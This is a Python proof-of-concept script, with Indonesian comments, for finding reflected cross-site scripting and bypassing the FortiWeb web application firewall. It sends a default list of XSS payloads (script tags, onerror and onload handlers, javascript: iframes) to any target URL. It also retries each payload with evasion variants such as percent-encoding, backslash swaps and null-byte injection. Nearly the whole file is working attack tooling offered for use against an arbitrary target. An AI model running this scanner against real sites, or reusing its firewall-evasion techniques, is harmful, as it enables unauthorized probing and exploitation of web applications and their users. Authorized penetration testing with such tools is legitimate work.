import requests
import argparse
import logging
from urllib.parse import quote
from termcolor import colored

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_xss(url, payload):
    """Menguji kerentanan XSS dengan payload tertentu."""
    try:
        encoded_payload = quote(payload)
        response = requests.get(f"{url}?key={encoded_payload}")
        if payload in response.text:
            logging.warning(colored(f"Potensi XSS terdeteksi dengan payload: {payload}", "red"))
            return True
        else:
            logging.info(colored(f"Payload {payload} tidak berhasil.", "yellow"))
            return False
    except requests.exceptions.RequestException as e:
        logging.error(colored(f"Error saat mengirim permintaan: {e}", "red"))
        return False

def main():
    parser = argparse.ArgumentParser(description="PoC XSS Reflected dengan Bypass FortiWeb")
    parser.add_argument("url", help="URL target")
    parser.add_argument("-f", "--file", help="File berisi daftar payload XSS (opsional)")
    args = parser.parse_args()

    default_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    ]

    if args.file:
        with open(args.file, "r") as f:
            payloads = [line.strip() for line in f]
    else:
        payloads = default_payloads

    logging.info(colored(f"Mulai pengujian XSS pada {args.url}", "green"))

    for payload in payloads:
        logging.info(colored(f"Menguji payload: {payload}", "blue"))

        if test_xss(args.url, payload):
            break
        if test_xss(args.url, payload.replace("<", "%3C")):  # Encoding HTML
            break
        if test_xss(args.url, payload.replace(" ", "%20")):  # Encoding URL
            break
        if test_xss(args.url, payload.replace("'", "%27")):  # Encoding tanda kutip tunggal
            break
        if test_xss(args.url, payload.replace('"', "%22")):  # Encoding tanda kutip ganda
            break
        if test_xss(args.url, payload.replace("(", "%28").replace(")", "%29")):  # Encoding tanda kurung
            break
        if test_xss(args.url, payload.replace("/", "\\")):  # Ganti garis miring
            break
        if test_xss(args.url, payload.replace("javascript", "java\0script")):  # Null byte injection
            break
        if test_xss(args.url, payload.replace("script", "scri\0pt")):  # Null byte injection
            break

if __name__ == "__main__":
    main()
